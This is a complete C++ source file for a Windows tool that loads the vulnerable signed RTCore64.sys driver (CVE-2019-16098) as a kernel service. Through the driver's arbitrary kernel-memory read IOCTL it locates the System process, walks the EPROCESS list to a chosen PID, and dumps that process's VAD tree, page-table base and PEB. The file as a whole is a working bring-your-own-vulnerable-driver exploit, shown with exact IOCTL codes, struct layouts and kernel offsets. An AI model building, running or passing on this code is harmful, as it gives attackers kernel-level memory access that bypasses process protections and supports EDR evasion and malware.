// mapper_rt.cpp — c++17 x64, Windows 10/11, external process mapper via RTCore64.sys
// build: cl /std:c++17 /W4 /permissive- /EHsc /O2 /DUNICODE /D_UNICODE mapper_rt.cpp ^
//           /link advapi32.lib
// usage: mapper_rt.exe <pid> [--driver path\to\RTCore64.sys] [out.txt]
//
// requires: elevated prompt; driver loads via SCM (signed MSI Afterburner driver,
// CVE-2019-16098). HVCI / Microsoft Vulnerable Driver Blocklist will refuse the load
// on hardened builds — see bench notes.

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <winioctl.h>
#include <cinttypes>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cwchar>
#include <memory>
#include <string>
#include <vector>
#include <stack>
#include <algorithm>

// ---------------------------------------------------------------------------
// constants block — IOCTLs, service names, kernel struct offsets.
// offsets are for Windows 10 21H2 / Windows 11 22H2–23H2 x64. verify your
// build with: kd> dt nt!_EPROCESS / dt nt!_MMVAD_SHORT / dt nt!_MMVAD /
//              dt nt!_CONTROL_AREA / dt nt!_FILE_OBJECT
// ---------------------------------------------------------------------------
namespace k {

// RTCore64 device + service
constexpr const wchar_t* kSvcName   = L"RTCore64";
constexpr const wchar_t* kSvcDisp   = L"RTCore64";
constexpr const wchar_t* kDevPath   = L"\\\\.\\RTCore64";

// RTCore64 memcpy ioctls
constexpr ULONG IOCTL_RTC_READ  = 0x80002048; // memcpy from arbitrary KVA
constexpr ULONG IOCTL_RTC_WRITE = 0x8000204C; // memcpy to   arbitrary KVA (unused)

// RTCore64 read-mmio input struct, 0x20 bytes
#pragma pack(push, 1)
struct RTC_MemReq {
    ULONG   pad0;        // 0x00
    ULONG   pad1;        // 0x04
    ULONG64 Address;     // 0x08  kernel virtual address
    ULONG64 Value;       // 0x10  read result (up to 8 bytes)
    ULONG   Size;        // 0x18  1,2,4,8
    ULONG   pad2;        // 0x1C
};
#pragma pack(pop)
static_assert(sizeof(RTC_MemReq) == 0x20, "RTC_MemReq must be 0x20");

// EPROCESS offsets (Win10 21H2 / Win11 22H2–23H2 x64). Shifts per build.
constexpr ULONG EP_DirectoryTableBase = 0x0028;
constexpr ULONG EP_UniqueProcessId    = 0x0440;
constexpr ULONG EP_ActiveProcessLinks = 0x0448;
constexpr ULONG EP_Peb                = 0x0550;
constexpr ULONG EP_ImageFileName      = 0x05A8; // UCHAR[15]
constexpr ULONG EP_VadRoot            = 0x07D8; // RTL_AVL_TREE { Root }

// RTL_BALANCED_NODE (VadNode is at offset 0 of _MMVAD_SHORT)
constexpr ULONG BN_Left   = 0x0000;
constexpr ULONG BN_Right  = 0x0008;
constexpr ULONG BN_Parent = 0x0010; // low 2 bits = balance

// _MMVAD_SHORT
constexpr ULONG VS_VadNode         = 0x0000;
constexpr ULONG VS_StartingVpn     = 0x0018; // ULONG
constexpr ULONG VS_EndingVpn       = 0x001C; // ULONG
constexpr ULONG VS_StartingVpnHigh = 0x0020; // UCHAR
constexpr ULONG VS_EndingVpnHigh   = 0x0021; // UCHAR
constexpr ULONG VS_u_VadFlags      = 0x0030; // ULONG — Protection<<3 | VadType

// _MMVAD extends _MMVAD_SHORT
constexpr ULONG VAD_Subsection     = 0x0048;

// _SUBSECTION
constexpr ULONG SS_ControlArea     = 0x0000;

// _CONTROL_AREA
constexpr ULONG CA_FilePointer     = 0x0040; // EX_FAST_REF — mask low 4 bits

// _FILE_OBJECT
constexpr ULONG FO_FileName        = 0x0058; // UNICODE_STRING { USHORT Len, USHORT Max, PWCH Buf }

} // namespace k

// ---------------------------------------------------------------------------
// handle RAII
// ---------------------------------------------------------------------------
struct HandleCloser { void operator()(HANDLE h) const noexcept {
    if (h && h != INVALID_HANDLE_VALUE) ::CloseHandle(h);
} };
using UniqueHandle = std::unique_ptr<std::remove_pointer_t<HANDLE>, HandleCloser>;

struct ScmCloser { void operator()(SC_HANDLE h) const noexcept {
    if (h) ::CloseServiceHandle(h);
} };
using UniqueScm = std::unique_ptr<std::remove_pointer_t<SC_HANDLE>, ScmCloser>;

// ---------------------------------------------------------------------------
// NtQuerySystemInformation glue — no ntdll.lib required
// ---------------------------------------------------------------------------
typedef NTSTATUS (NTAPI *pfnNQSI)(ULONG, PVOID, ULONG, PULONG);

constexpr ULONG SystemModuleInformation = 11;

struct RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
};
struct RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
};

static bool get_ntoskrnl(std::uint64_t& base_va, std::string& path_out) {
    HMODULE nt = ::GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    auto NQSI = reinterpret_cast<pfnNQSI>(::GetProcAddress(nt, "NtQuerySystemInformation"));
    if (!NQSI) return false;

    ULONG len = 0;
    NQSI(SystemModuleInformation, nullptr, 0, &len);
    if (len == 0) return false;
    std::vector<unsigned char> buf(len + 0x1000);
    ULONG got = 0;
    NTSTATUS st = NQSI(SystemModuleInformation, buf.data(),
                       static_cast<ULONG>(buf.size()), &got);
    if (st < 0 || got == 0) return false;

    auto* mods = reinterpret_cast<RTL_PROCESS_MODULES*>(buf.data());
    if (mods->NumberOfModules == 0) return false;
    const auto& m0 = mods->Modules[0]; // ntoskrnl.exe is always index 0
    base_va = reinterpret_cast<std::uint64_t>(m0.ImageBase);
    path_out.assign(reinterpret_cast<const char*>(m0.FullPathName));
    return true;
}

// ---------------------------------------------------------------------------
// parse on-disk ntoskrnl.exe for PsInitialSystemProcess export RVA
// ---------------------------------------------------------------------------
static bool find_export_rva(const wchar_t* image_path, const char* sym, ULONG& rva_out) {
    UniqueHandle fh(::CreateFileW(image_path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr));
    if (!fh) return false;
    UniqueHandle mh(::CreateFileMappingW(fh.get(), nullptr, PAGE_READONLY, 0, 0, nullptr));
    if (!mh) return false;
    auto* base = static_cast<unsigned char*>(
        ::MapViewOfFile(mh.get(), FILE_MAP_READ, 0, 0, 0));
    if (!base) return false;

    struct ViewCloser {
        unsigned char* p;
        ~ViewCloser() { if (p) ::UnmapViewOfFile(p); }
    } view{base};

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nh = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
    if (nh->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nh->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;

    // helper: RVA -> file offset
    auto rva_to_off = [&](ULONG rva) -> unsigned char* {
        auto* sec = IMAGE_FIRST_SECTION(nh);
        for (unsigned i = 0; i < nh->FileHeader.NumberOfSections; ++i, ++sec) {
            if (rva >= sec->VirtualAddress &&
                rva <  sec->VirtualAddress + sec->Misc.VirtualSize) {
                return base + sec->PointerToRawData + (rva - sec->VirtualAddress);
            }
        }
        return nullptr;
    };

    const auto& exp_dd =
        nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exp_dd.Size == 0) return false;
    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(rva_to_off(exp_dd.VirtualAddress));
    if (!exp) return false;

    auto* names   = reinterpret_cast<ULONG*>(rva_to_off(exp->AddressOfNames));
    auto* ordinals= reinterpret_cast<USHORT*>(rva_to_off(exp->AddressOfNameOrdinals));
    auto* funcs   = reinterpret_cast<ULONG*>(rva_to_off(exp->AddressOfFunctions));
    if (!names || !ordinals || !funcs) return false;

    for (ULONG i = 0; i < exp->NumberOfNames; ++i) {
        auto* nm = reinterpret_cast<const char*>(rva_to_off(names[i]));
        if (nm && std::strcmp(nm, sym) == 0) {
            rva_out = funcs[ordinals[i]];
            return true;
        }
    }
    return false;
}

// ---------------------------------------------------------------------------
// service manager — install / start / stop / delete RTCore64
// ---------------------------------------------------------------------------
static bool svc_create_and_start(const std::wstring& driver_path) {
    UniqueScm scm(::OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS));
    if (!scm) { std::fprintf(stderr, "OpenSCManager failed: %lu\n", ::GetLastError()); return false; }

    UniqueScm svc(::OpenServiceW(scm.get(), k::kSvcName, SERVICE_ALL_ACCESS));
    if (!svc) {
        svc.reset(::CreateServiceW(scm.get(), k::kSvcName, k::kSvcDisp,
                                   SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                   SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                   driver_path.c_str(),
                                   nullptr, nullptr, nullptr, nullptr, nullptr));
        if (!svc) {
            std::fprintf(stderr, "CreateService failed: %lu\n", ::GetLastError());
            return false;
        }
    }
    if (!::StartServiceW(svc.get(), 0, nullptr)) {
        DWORD e = ::GetLastError();
        if (e != ERROR_SERVICE_ALREADY_RUNNING) {
            std::fprintf(stderr, "StartService failed: %lu "
                                 "(HVCI / vulnerable-driver blocklist?)\n", e);
            return false;
        }
    }
    return true;
}

static void svc_stop_and_delete() {
    UniqueScm scm(::OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS));
    if (!scm) return;
    UniqueScm svc(::OpenServiceW(scm.get(), k::kSvcName, SERVICE_ALL_ACCESS));
    if (!svc) return;
    SERVICE_STATUS st{};
    ::ControlService(svc.get(), SERVICE_CONTROL_STOP, &st);
    ::DeleteService(svc.get());
}

// ---------------------------------------------------------------------------
// driver IO — read arbitrary kernel virt via RTCore64 ioctl 0x80002048
// ---------------------------------------------------------------------------
class RtCore {
public:
    bool open() {
        hDev_.reset(::CreateFileW(k::kDevPath,
                                  GENERIC_READ | GENERIC_WRITE,
                                  0, nullptr, OPEN_EXISTING, 0, nullptr));
        return hDev_.get() != INVALID_HANDLE_VALUE;
    }

    // read `size` bytes (1/2/4/8) from kernel VA `addr` into `out`.
    bool read_sized(std::uint64_t addr, void* out, ULONG size) {
        if (size != 1 && size != 2 && size != 4 && size != 8) return false;
        k::RTC_MemReq req{};
        req.Address = addr;
        req.Size    = size;
        DWORD ret = 0;
        if (!::DeviceIoControl(hDev_.get(), k::IOCTL_RTC_READ,
                               &req, sizeof(req), &req, sizeof(req),
                               &ret, nullptr)) {
            return false;
        }
        std::memcpy(out, &req.Value, size);
        return true;
    }

    // read `n` bytes from `addr`, 8 at a time (slow but general).
    bool read_buf(std::uint64_t addr, void* out, std::size_t n) {
        auto* p = static_cast<unsigned char*>(out);
        std::size_t i = 0;
        while (i < n) {
            std::size_t chunk = (n - i >= 8) ? 8 : (n - i >= 4 ? 4 : (n - i >= 2 ? 2 : 1));
            std::uint64_t v = 0;
            if (!read_sized(addr + i, &v, static_cast<ULONG>(chunk))) return false;
            std::memcpy(p + i, &v, chunk);
            i += chunk;
        }
        return true;
    }

    // typed helpers
    bool u8 (std::uint64_t a, std::uint8_t&  v) { return read_sized(a, &v, 1); }
    bool u16(std::uint64_t a, std::uint16_t& v) { return read_sized(a, &v, 2); }
    bool u32(std::uint64_t a, std::uint32_t& v) { return read_sized(a, &v, 4); }
    bool u64(std::uint64_t a, std::uint64_t& v) { return read_sized(a, &v, 8); }

    // read a UNICODE_STRING at `us_addr`, decode wchar buffer, return utf8.
    // caps at 1024 wchars.
    bool read_unicode_string(std::uint64_t us_addr, std::string& out) {
        std::uint16_t len = 0, maxlen = 0;
        std::uint64_t buf = 0;
        if (!u16(us_addr + 0x00, len))    return false;
        if (!u16(us_addr + 0x02, maxlen)) return false;
        if (!u64(us_addr + 0x08, buf))    return false;
        if (len == 0 || buf == 0) { out.clear(); return true; }
        ULONG take = len;
        if (take > 2048) take = 2048; // cap
        std::vector<wchar_t> wbuf(take / 2 + 1, L'\0');
        if (!read_buf(buf, wbuf.data(), take)) return false;
        wbuf[take / 2] = L'\0';
        int n = ::WideCharToMultiByte(CP_UTF8, 0, wbuf.data(), -1,
                                      nullptr, 0, nullptr, nullptr);
        if (n <= 1) { out.clear(); return true; }
        out.resize(static_cast<std::size_t>(n - 1));
        ::WideCharToMultiByte(CP_UTF8, 0, wbuf.data(), -1,
                              out.data(), n, nullptr, nullptr);
        return true;
    }

private:
    UniqueHandle hDev_;
};

// ---------------------------------------------------------------------------
// EPROCESS traversal — find target by PID
// ---------------------------------------------------------------------------
static bool find_eprocess_by_pid(RtCore& rt, std::uint64_t system_eprocess,
                                 std::uint64_t target_pid,
                                 std::uint64_t& out_eproc)
{
    const std::uint64_t head_offset = k::EP_ActiveProcessLinks;
    std::uint64_t head = system_eprocess + head_offset;
    std::uint64_t cur = 0;
    if (!rt.u64(head, cur)) return false; // Flink of System

    for (int i = 0; i < 4096; ++i) {
        std::uint64_t eproc = cur - head_offset;
        std::uint64_t pid = 0;
        if (!rt.u64(eproc + k::EP_UniqueProcessId, pid)) return false;
        if (pid == target_pid) { out_eproc = eproc; return true; }
        std::uint64_t next = 0;
        if (!rt.u64(cur + 0x00, next)) return false; // Flink
        if (next == head) break;
        cur = next;
    }
    return false;
}

// ---------------------------------------------------------------------------
// VAD AVL walk — iterative in-order, bounded, protection+file resolve
// ---------------------------------------------------------------------------
static const char* vad_protect_str(ULONG p5) {
    // 5-bit MM_PROTECTION mask
    switch (p5 & 0x7) {
        case 0: return "------";
        case 1: return "R-----"; // readonly
        case 2: return "--X---"; // execute
        case 3: return "R-X---"; // execute+read
        case 4: return "RW----"; // readwrite
        case 5: return "RWC---"; // writecopy
        case 6: return "RWX---"; // execute+rw
        case 7: return "RWXC--"; // execute+writecopy
    }
    return "?-----";
}
static const char* vad_type_str(ULONG t) {
    switch (t) {
        case 0: return "Private    ";
        case 1: return "PhysMem    ";
        case 2: return "ImageMap   ";
        case 3: return "Awe        ";
        case 4: return "WriteWatch ";
        case 5: return "LargePages ";
        case 6: return "RotatePhys ";
        case 7: return "LargePageSc";
    }
    return "?          ";
}

struct VadRow {
    std::uint64_t start;
    std::uint64_t end;
    ULONG         protection;
    ULONG         type;
    std::string   file;
};

static bool walk_vad_tree(RtCore& rt, std::uint64_t eproc, std::vector<VadRow>& rows)
{
    std::uint64_t root = 0;
    if (!rt.u64(eproc + k::EP_VadRoot, root)) return false;
    if (root == 0) return true;

    std::stack<std::uint64_t> st;
    std::uint64_t node = root;
    int guard = 0;

    auto read_file_of_vad = [&](std::uint64_t vad, std::string& out) {
        out.clear();
        // Only full _MMVAD has Subsection; _MMVAD_SHORT does not.
        // We attempt read; if subsection ptr is NULL or bogus, skip.
        std::uint64_t subsection = 0;
        if (!rt.u64(vad + k::VAD_Subsection, subsection)) return;
        if (subsection < 0xFFFF800000000000ULL) return; // not a KVA
        std::uint64_t ca = 0;
        if (!rt.u64(subsection + k::SS_ControlArea, ca)) return;
        if (ca < 0xFFFF800000000000ULL) return;
        std::uint64_t fp_raw = 0;
        if (!rt.u64(ca + k::CA_FilePointer, fp_raw)) return;
        std::uint64_t fp = fp_raw & ~0xFULL; // EX_FAST_REF
        if (fp < 0xFFFF800000000000ULL) return;
        rt.read_unicode_string(fp + k::FO_FileName, out);
    };

    while (node != 0 || !st.empty()) {
        while (node != 0) {
            if (++guard > 200000) return true; // bail hard — offsets drifted
            st.push(node);
            std::uint64_t left = 0;
            if (!rt.u64(node + k::VS_VadNode + k::BN_Left, left)) return false;
            node = left;
        }
        node = st.top(); st.pop();

        // visit
        std::uint32_t svpn = 0, evpn = 0;
        std::uint8_t  svpnh = 0, evpnh = 0;
        std::uint32_t uflags = 0;
        if (!rt.u32(node + k::VS_StartingVpn, svpn))   return false;
        if (!rt.u32(node + k::VS_EndingVpn,   evpn))   return false;
        rt.u8(node + k::VS_StartingVpnHigh, svpnh);
        rt.u8(node + k::VS_EndingVpnHigh,   evpnh);
        rt.u32(node + k::VS_u_VadFlags, uflags);

        VadRow r{};
        r.start = ((std::uint64_t)svpnh << 32 | svpn) * 0x1000ULL;
        r.end   = (((std::uint64_t)evpnh << 32 | evpn) + 1ULL) * 0x1000ULL;
        r.type       =  uflags        & 0x7u;
        r.protection = (uflags >> 3)  & 0x1Fu;
        read_file_of_vad(node, r.file);
        rows.push_back(std::move(r));

        std::uint64_t right = 0;
        if (!rt.u64(node + k::VS_VadNode + k::BN_Right, right)) return false;
        node = right;
    }
    return true;
}

// ---------------------------------------------------------------------------
// output
// ---------------------------------------------------------------------------
static void print_summary(FILE* f, std::uint64_t pid,
                          std::uint64_t eproc, std::uint64_t dirbase,
                          std::uint64_t peb, const char* image,
                          std::uint64_t ntos_base, std::uint64_t sys_eproc)
{
    std::fprintf(f, "== target ==\n");
    std::fprintf(f, "pid               : %" PRIu64 "\n", pid);
    std::fprintf(f, "image             : %s\n", image ? image : "?");
    std::fprintf(f, "EPROCESS          : 0x%016" PRIx64 "\n", eproc);
    std::fprintf(f, "DirectoryTableBase: 0x%016" PRIx64 "\n", dirbase);
    std::fprintf(f, "PEB               : 0x%016" PRIx64 "\n", peb);
    std::fprintf(f, "ntoskrnl base     : 0x%016" PRIx64 "\n", ntos_base);
    std::fprintf(f, "System EPROCESS   : 0x%016" PRIx64 "\n", sys_eproc);
}

static void print_vads(FILE* f, const std::vector<VadRow>& rows) {
    std::fprintf(f, "\n== VAD tree (%zu nodes) ==\n", rows.size());
    std::fprintf(f, "%-18s %-18s %-10s %-12s %-6s %s\n",
                 "start", "end", "size", "type", "prot", "file");
    std::uint64_t total = 0;
    for (const auto& r : rows) {
        std::uint64_t sz = r.end > r.start ? r.end - r.start : 0;
        total += sz;
        std::fprintf(f,
            "0x%016" PRIx64 " 0x%016" PRIx64 " 0x%08" PRIx64 " %s %s %s\n",
            r.start, r.end, sz,
            vad_type_str(r.type),
            vad_protect_str(r.protection),
            r.file.empty() ? "-" : r.file.c_str());
    }
    std::fprintf(f, "-- total mapped: 0x%" PRIx64 " bytes --\n", total);
}

// ---------------------------------------------------------------------------
// cli + driver path resolution
// ---------------------------------------------------------------------------
static std::wstring default_driver_path() {
    wchar_t buf[MAX_PATH]{};
    DWORD n = ::GetModuleFileNameW(nullptr, buf, MAX_PATH);
    if (n == 0) return L"RTCore64.sys";
    wchar_t* p = std::wcsrchr(buf, L'\\');
    if (p) *(p + 1) = 0;
    return std::wstring(buf) + L"RTCore64.sys";
}

static void usage() {
    std::fprintf(stderr,
        "mapper_rt.exe <pid> [--driver path\\to\\RTCore64.sys] [out.txt]\n"
        "  loads RTCore64 via SCM, walks EPROCESS/VAD for <pid>, unloads driver.\n"
        "  must run elevated. driver default: <exe-dir>\\RTCore64.sys\n");
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 2) { usage(); return 2; }

    std::uint64_t target_pid = 0;
    {
        wchar_t* end = nullptr;
        unsigned long long v = std::wcstoull(argv[1], &end, 0);
        if (!end || *end != 0 || v == 0) { usage(); return 2; }
        target_pid = v;
    }

    std::wstring driver = default_driver_path();
    std::wstring outpath;
    for (int i = 2; i < argc; ++i) {
        if (std::wcscmp(argv[i], L"--driver") == 0 && i + 1 < argc) {
            driver = argv[++i];
        } else {
            outpath = argv[i];
        }
    }

    FILE* out = stdout;
    FILE* fout = nullptr;
    if (!outpath.empty()) {
        if (_wfopen_s(&fout, outpath.c_str(), L"w") == 0 && fout) out = fout;
    }

    // 1) locate ntoskrnl base + path
    std::uint64_t ntos_base = 0;
    std::string ntos_path_dos;
    if (!get_ntoskrnl(ntos_base, ntos_path_dos)) {
        std::fprintf(stderr, "ntoskrnl base lookup failed\n");
        if (fout) std::fclose(fout);
        return 1;
    }
    // path from NQSI is \SystemRoot-relative or a DOS path; map to canonical
    std::wstring ntos_file;
    {
        wchar_t sysdir[MAX_PATH]{};
        ::GetSystemDirectoryW(sysdir, MAX_PATH);
        ntos_file = std::wstring(sysdir) + L"\\ntoskrnl.exe";
    }

    // 2) parse on-disk ntoskrnl for PsInitialSystemProcess RVA
    ULONG rva_pisp = 0;
    if (!find_export_rva(ntos_file.c_str(), "PsInitialSystemProcess", rva_pisp)) {
        std::fprintf(stderr, "PsInitialSystemProcess export not found in %ls\n",
                     ntos_file.c_str());
        if (fout) std::fclose(fout);
        return 1;
    }

    // 3) install + start RTCore64
    if (!svc_create_and_start(driver)) {
        svc_stop_and_delete();
        if (fout) std::fclose(fout);
        return 1;
    }
    struct DrvGuard { ~DrvGuard() { svc_stop_and_delete(); } } drv_guard;

    // 4) open device
    RtCore rt;
    if (!rt.open()) {
        std::fprintf(stderr, "open \\\\.\\RTCore64 failed: %lu\n", ::GetLastError());
        if (fout) std::fclose(fout);
        return 1;
    }

    // 5) deref PsInitialSystemProcess → System EPROCESS KVA
    std::uint64_t sys_eproc = 0;
    if (!rt.u64(ntos_base + rva_pisp, sys_eproc) || sys_eproc == 0) {
        std::fprintf(stderr, "read PsInitialSystemProcess failed\n");
        if (fout) std::fclose(fout);
        return 1;
    }

    // 6) walk ActiveProcessLinks → target EPROCESS
    std::uint64_t t_eproc = 0;
    if (!find_eprocess_by_pid(rt, sys_eproc, target_pid, t_eproc)) {
        std::fprintf(stderr, "pid %" PRIu64 " not found in active process list\n",
                     target_pid);
        if (fout) std::fclose(fout);
        return 1;
    }

    // 7) pull target fields
    std::uint64_t dirbase = 0, peb = 0;
    rt.u64(t_eproc + k::EP_DirectoryTableBase, dirbase);
    rt.u64(t_eproc + k::EP_Peb, peb);
    char imgname[16]{};
    rt.read_buf(t_eproc + k::EP_ImageFileName, imgname, 15);
    imgname[15] = 0;

    // 8) walk VAD tree
    std::vector<VadRow> rows;
    if (!walk_vad_tree(rt, t_eproc, rows)) {
        std::fprintf(stderr, "VAD walk aborted (offsets drifted for this build?)\n");
    }
    // sort by start — AVL in-order should already be sorted, but defend
    std::sort(rows.begin(), rows.end(),
              [](const VadRow& a, const VadRow& b){ return a.start < b.start; });

    // 9) print
    print_summary(out, target_pid, t_eproc, dirbase, peb, imgname,
                  ntos_base, sys_eproc);
    print_vads(out, rows);

    if (fout) std::fclose(fout);
    return 0;
}
